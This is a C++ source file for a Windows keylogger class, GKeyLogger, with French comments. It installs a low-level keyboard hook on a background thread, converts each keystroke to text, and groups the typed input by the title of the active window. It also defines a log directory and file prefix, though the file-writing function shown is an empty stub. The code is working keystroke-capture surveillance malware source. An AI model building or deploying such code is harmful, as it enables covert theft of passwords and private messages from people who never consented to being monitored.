#include "GKeyLogger.h"

HHOOK		hKeyHook;
GStringMap	_map;
GString		_file;
GString		_prefix;
GString		_path;

GString		GetActiveWindowName(void)
{
	HWND hwd = GetForegroundWindow();
	if (hwd == NULL)
		throw GException("GKeyLogger", "Error GetActiveWindow");
	int max = 1024;
	char buffer[1024];
	int nbChar = GetWindowText(hwd, buffer, max);
	if (nbChar == 0)
		throw GException("GKeyLogger", "Error GetWindowText() !");
	return (buffer);
}

void	WriteKeyLogger(GString Name)
{
	

}

 __declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam ) 
 {
	GString name = GetActiveWindowName();
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) 
	{
		 // conversion du code -> ascii
		BYTE KeyState[256];
		WORD wBuf;
		char ch;
		// Structure pour récupération des informations
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
		/* Traitement récupération dec codes des touches */
		// Etat du clavier
		GetKeyboardState(KeyState);
		// Conversion code > ascii
		ToAscii(hooked.vkCode, hooked.scanCode ,KeyState,&wBuf,0);
		 //on rajoute les touches non traitées par le hook
		switch (hooked.vkCode)
		{
			case VK_TAB : { _map.EraseKey(name); WriteKeyLogger(name); break; }
			case VK_RETURN : { _map.EraseKey(name); WriteKeyLogger(name); break; }
			case VK_BACK : { _map[name] = _map[name].Substr(0, _map[name].Size() - 1); break; }
			case VK_NUMPAD0 : { _map[name] += "0"; break; }
			case VK_NUMPAD1 : { _map[name] += "1"; break; }
			case VK_NUMPAD2 : { _map[name] += "2"; break; }
			case VK_NUMPAD3 : { _map[name] += "3"; break; }
			case VK_NUMPAD4 : { _map[name] += "4"; break; }
			case VK_NUMPAD5 : { _map[name] += "5"; break; }
			case VK_NUMPAD6 : { _map[name] += "6"; break; }
			case VK_NUMPAD7 : { _map[name] += "7"; break; }
			case VK_NUMPAD8 : { _map[name] += "8"; break; }
			case VK_NUMPAD9 : { _map[name] += "9"; break; }

			case VK_MULTIPLY: { _map[name] += "*"; break; }
			case VK_ADD : { _map[name] += "+"; break; }
			case VK_SUBTRACT: { _map[name] += "-"; break; }
			case VK_DECIMAL : { _map[name] += "."; break; }
			case VK_DIVIDE : { _map[name] += "/"; break; }

 
			case VK_DELETE: {printf("<Suppr>");break;}

			default : { // on affiche les touches tappées
				ch=((char)wBuf);
				_map[name] += ch;
				break;
				}

		}
	}
	for (unsigned int i = 0; i < _map.Size(); ++i)
	{
		std::cout << _map.Key(i) << " - " << _map.Value(i) << std::endl;
	}
	// Renvoi des messages au sytème
	return CallNextHookEx(hKeyHook, nCode,wParam,lParam);
}

GKeyLogger::GKeyLogger(void)
{
	_prefix = "log_";
	_path = "c:\\";
	this->_activate = false;
}

GKeyLogger::~GKeyLogger(void)
{
	if (this->_activate)
	{
		UnhookWindowsHookEx(hKeyHook);
		this->_thread.Abort();
	}
}
void		GKeyLogger::SetDirectory(const GString &Path)
{
	_path = Path;
}
void		GKeyLogger::SetPrefix(const GString &Prefix)
{
	_prefix = Prefix;
}
bool		GKeyLogger::IsActivated(void) const
{
	return (this->_activate);
}

void	*th(void *arg)
{
	GKeyLogger *m = (GKeyLogger *)arg;
	m->Start();
	return (NULL);
}

void		GKeyLogger::Activate(void)
{
	if (!this->_activate)
	{
		this->_thread.SetFunction(&th);
		this->_thread.Start(this);
	}
}

void		GKeyLogger::Start(void)
{
	std::cout << "keyloggerstart" << std::endl;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe)
	{
		this->_activate = false;
		return ;
	}
	hKeyHook = SetWindowsHookEx (WH_KEYBOARD_LL,(HOOKPROC) KeyEvent,hExe, NULL);
	if (hKeyHook == NULL)
	{
		this->_activate = false;
		return ;
	}
	MSG message;
	while (GetMessage(&message,NULL,0,0)) 
	{
		TranslateMessage( &message );
		DispatchMessage( &message );
	} 
}

void		GKeyLogger::Desactivate(void)
{
	if (this->_activate)
	{
		if (UnhookWindowsHookEx(hKeyHook) == 0)
			return ;
		this->_thread.Abort();
		this->_activate = false;
	}
}


